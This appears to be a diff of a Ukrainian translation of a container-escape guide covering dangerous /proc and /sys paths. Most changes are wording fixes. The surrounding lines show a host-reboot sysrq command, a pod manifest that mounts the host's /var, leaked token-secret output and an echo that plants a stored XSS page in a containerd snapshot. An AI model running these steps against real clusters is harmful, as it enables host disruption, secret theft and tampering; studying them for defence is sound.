@@ -50,7 +50,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
 #### **`/proc/sys/vm/panic_on_oom`**
 
 - Згадується в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Глобальний прапор, який контролює, чи панікує ядро або викликає OOM вбивцю, коли виникає умова OOM.
+- Глобальний прапор, який контролює, чи панікує ядро або викликає OOM killer, коли виникає умова OOM.
 
 #### **`/proc/sys/fs`**
 
@@ -60,7 +60,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
 #### **`/proc/sys/fs/binfmt_misc`**
 
 - Дозволяє реєструвати інтерпретатори для ненативних бінарних форматів на основі їх магічного номера.
-- Може призвести до підвищення привілеїв або доступу до кореневого терміналу, якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису.
+- Може призвести до ескалації привілеїв або доступу до root shell, якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису.
 - Відповідна експлуатація та пояснення:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Докладний посібник: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
@@ -70,7 +70,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
 #### **`/proc/config.gz`**
 
 - Може розкрити конфігурацію ядра, якщо `CONFIG_IKCONFIG_PROC` увімкнено.
-- Корисно для зловмисників для виявлення вразливостей у запущеному ядрі.
+- Корисно для атакуючих для виявлення вразливостей у запущеному ядрі.
 
 #### **`/proc/sysrq-trigger`**
 
@@ -84,7 +84,7 @@ echo b > /proc/sysrq-trigger # Reboots the host
 #### **`/proc/kmsg`**
 
 - Відкриває повідомлення з кільцевого буфера ядра.
-- Може допомогти в експлуатації ядра, витоках адрес та надати чутливу інформацію про систему.
+- Може допомогти в експлуатації ядра, витоках адрес і надати чутливу інформацію про систему.
 
 #### **`/proc/kallsyms`**
 
@@ -96,7 +96,7 @@ echo b > /proc/sysrq-trigger # Reboots the host
 #### **`/proc/[pid]/mem`**
 
 - Інтерфейс з пристроєм пам'яті ядра `/dev/mem`.
-- Історично вразливий до атак підвищення привілеїв.
+- Історично вразливий до атак ескалації привілеїв.
 - Більше про [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
@@ -119,12 +119,12 @@ echo b > /proc/sysrq-trigger # Reboots the host
 #### **`/proc/sched_debug`**
 
 - Повертає інформацію про планування процесів, обходячи захисти простору PID.
-- Відкриває імена процесів, ID та ідентифікатори cgroup.
+- Витікає імена процесів, ID та ідентифікатори cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
 
 - Надає інформацію про точки монту в просторі монту процесу.
-- Відкриває місцезнаходження контейнера `rootfs` або образу.
+- Витікає місцезнаходження контейнера `rootfs` або образу.
 
 ### Вразливості `/sys`
 
@@ -199,17 +199,17 @@ metadata:
     app: pentest  
 spec:  
   containers:  
-    - name: pod-mounts-var-folder  
-      image: alpine  
-      volumeMounts:  
-        - mountPath: /host-var  
-          name: noderoot  
-      command: [ "/bin/sh", "-c", "--" ]  
-      args: [ "while true; do sleep 30; done;" ]  
+  - name: pod-mounts-var-folder  
+    image: alpine  
+    volumeMounts:  
+    - mountPath: /host-var  
+      name: noderoot  
+    command: [ "/bin/sh", "-c", "--" ]  
+    args: [ "while true; do sleep 30; done;" ]  
   volumes:  
-    - name: noderoot  
-      hostPath:  
-        path: /var
+  - name: noderoot  
+    hostPath:  
+      path: /var
 ```
 
 Inside the **pod-mounts-var-folder** container:
@@ -231,8 +231,7 @@ REFRESH_TOKEN_SECRET=14<SNIP>ea
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
 
-/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
-are/nginx/html/index2.html
+/ # echo '<!DOCTYPE html><html lang="uk"><head><script>alert("Збережений XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index2.html
 ```
 
 The XSS was achieved:
